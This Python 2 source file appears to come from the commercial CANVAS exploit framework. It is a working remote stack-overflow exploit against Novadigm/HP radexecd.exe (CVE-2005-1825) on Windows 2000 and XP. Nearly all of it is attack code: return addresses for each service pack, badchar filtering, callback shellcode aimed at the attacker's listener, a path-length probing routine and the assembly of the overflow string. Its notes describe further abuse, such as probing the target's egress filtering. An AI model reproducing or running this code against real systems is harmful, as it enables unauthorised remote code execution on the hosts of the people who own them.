#! /usr/bin/env python

#
# CANVAS radexecd.exe exploit


#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import chunkedaddencoder
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="radexecd.exe"
DESCRIPTION="Novadigm 3.1 radexecd.exe stack overflow."
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="HP"
DOCUMENTATION["Reliability"]="This is a one-shot exploit. It's single threaded."
DOCUMENTATION["Release Date"]="Apr 28, 2005"
DOCUMENTATION["CVE Name"] = "CVE-2005-1825"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1825"
DOCUMENTATION['CVSS'] = 7.5


#QO44056 fixes this?
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP" ]

NOTES="""
Executable: radexecd.exe

There's actually several vulnerabilities:
    1. Can portscan from target host to attacking host using first argument. 
    This can be used to find out the exfiltration filter of the target.
    
    2. Can execute arbitrary programs in the Novadigm directory of the target.
    
    3. Can overflow internally a buffer used to store an error message when doing
    commands. (with various varients on this theme, two of which we exploit here) 
    
If covertness is really high, this exploit does not do the information leak to
find the exact path length.

"""

CHANGELOG="""

"""



runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=3465
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring=" /\\.\r\n\x00\"&^\t"
        self.badstring_old=self.searchbadstring
        self.badstring_new="\x00\x20"
        self.ssl=0
        self.setVersions()
        self.version=1
        self.name=NAME

        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #these need to be normalized!
        #name, jmp esp
        self.versions[1]=("Windows 2000 SP 4",0x74fdee63)
        self.versions[2]=("Windows 2000 SP 3",0x74fd2d57)
        self.versions[3]=("Windows XP Pro SP 1",0x77f9980f) 
        self.versions[4]=("Windows XP Pro SP 1a",0x71a5403d)
        self.versions[5]=("Windows 2000 Server SP0",0x74fd5697)
        return


    def neededListenerTypes(self):
        #GO Code
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        """
        For some reason the GO Code is not reliable with radia. It either
        hangs on a FD, or doesn't find the socket. It does work sometimes
        but sometimes isn't enough.
        
        We create two shellcodes here.
        """
        localhost=self.callback.ip
        localport=self.callback.port
        self.badstring=self.badstring_new
        self.shellcode_new=self.createSmallWin32Shellcode(localhost,localport)
        self.badstring=self.badstring_old
        return self.createWin32Shellcode(self.badstring_old,localhost,localport,)        
        
    def test(self):
        """
        
        """
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
            #should modify to do the send...
        except:
            self.log("No connection could be established")
            return 0
        return 1

    def longpath(self):
        """
        Tries a long path overflow which will affect 3.1.2.0, but not 3.1.0.-
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        #use the CreateProcess(filename+any number of spaces) trick
        #rimdiff is in the default directory and doesn't appear to do 
        #anything.
        length=900
        filename="rimdiff.exe"
        attackstr="\xcc"*length
        geteip=self.versions[self.version][1]
        offset=532
        attackstr=stroverwrite(attackstr, intel_order(geteip),offset)
        attackstr=stroverwrite(attackstr, self.shellcode_new, offset+4)
        command=filename+" "+attackstr
        sploitstring="\x00".join(["","UID","password",command])+"\x00"
        s.sendall(sploitstring)
        #data=s.recv(1000)
        #self.log("Recved: %s"%prettyprint(data))
        time.sleep(1)
        if self.ISucceeded():
            return 1
        #sys.exit(1)
        return 0
    
    def getlength(self):
        """
        Gets the length of the environment string prepended to our string
        If this returns 992 you have 992 bytes to play with, you've determined the
        length of the environment string to be 20.
        (plus 1 for null)
        
         python -c 'print "%d"%(len("C:/progr~1/novadigm/")+992+11+1)' 
         1024

        """
        testfile="rimdiff.exe"
        length=0x401-len(testfile)
        toplength=length
        done=0
        self.log("Testing length using %s"%testfile)
        while not done:
            try:
                length+=-1
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                #use the CreateProcess(filename+any number of spaces) trick
                #rimdiff is in the default directory and doesn't appear to do 
                #anything.
                command=testfile+" "*length
                sploitstring="\x00".join(["","UID","password",command])+"\x00"
                s.sendall(sploitstring)
                time.sleep(2)
                data=""
                data+=s.recv(1000)
                #we'll get a \x00 when the command works.
                self.log("Length test received: (%s)"%prettyprint(data))
                if data.count("Unable to execute")==0 and data!="" and data[0]!="\x01":
                    done=1
            except:
                #import traceback
                #traceback.print_exc(file=sys.stdout)
                self.log("Attack reported no open socket - service died?")
                return -1
        self.log("Valid length was %d (%d)"%(length,toplength-length))
        return 1024-length-len(testfile)-1 #account for rimdiff.exe and trailing null
    
    def run(self):
        self.host=self.target.interface
        port=int(self.argsDict["port"])
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic versioning not enabled.")
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 0

        self.log("Attempting long path length overflow")
        if self.longpath():
            self.log("Succeeded against a 3.1.2.0 radia")
            return 1

        self.log("Attacking %s:%d"%(self.host,self.port))
        #the following information leak primitive is essential
        #for reliable exploitation

        if self.covertness<8:
            #iterative and slow process to find exact command length
            length=self.getlength() 
        else:
            length=20 #hardcode for speed/covertness (Default install)
            #length=25
            #length=47 #hardcode for speed/covertness

        if length==-1:
            self.log("Failed to get length...")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        else:
            self.log("Length found to be %d"%length)
        
        sploitstring=self.makesploit(length)
        if sploitstring==0:
            self.log("Was not able to run attack due to encoder problems")
            return 0
        
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            s.sendall(sploitstring)
            #if not using GOCode:
            if 1:
                data=""
                data+=s.recv(1000)
                self.log("Attack received: %s"%prettyprint(data))
            ret=0
            i=0
            if 0: #using GOCode
                while ret==0 and i<20:
                    ret=self.checkTriggerWin32(s)
                    i+=1
                if ret:
                    self.log("Got trigger!")
                    import win32MosdefShellServer
                    shell = win32MosdefShellServer.win32shellserver(s,self.logfunction)
                    self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))                    
                    return shell
                else:
                    self.log("No trigger?!")
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
                    
            return self.ISucceeded()

        time.sleep(3)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))                    
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
    def makesploit(self,envlength):
        """
        Construct the attack given the length of the environment string (default
        is 20 bytes)
        """

        #geteip=self.versions[self.version][1]
        #writeloc=self.versions[self.version][2]
        
        sploitstring=""
        port=""
        uid="Administrator"
        password="Nothing"
        command="A"*0x380+".B"
        shellloc=0
        retloc=512-envlength-len("File extention on length invalid in executable:")
        retloc+=1 #unsure why this is, but it is
        retloc+=8 #unsure as to why this is as well
        retloc-=shellloc #offset into command which is our shellcode
        
        #A jmp esp
        #eipval=0x01020304        
        eipval=self.versions[self.version][1] #get eip value
        if self.addjmpesp(retloc,eipval,-1244)==0:
            self.log("could not create chunk header!")
            return 0
        self.log("Retloc=%d"%retloc)

        self.log("Length of shellcode is %d"%len(self.shellcode))
        command=stroverwrite(command,self.shellcode,shellloc)
        self.log("length of command is %d"%len(command))
        #if port is a number, host will connect back to you on that port!
        #this is potentially used for passwork and uid verification - most likely
        #there are other bugs here.
        sploitstring=port+"\x00"+uid+"\x00"+password+"\x00"+command+"\x00"
        
        return sploitstring
    
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

    

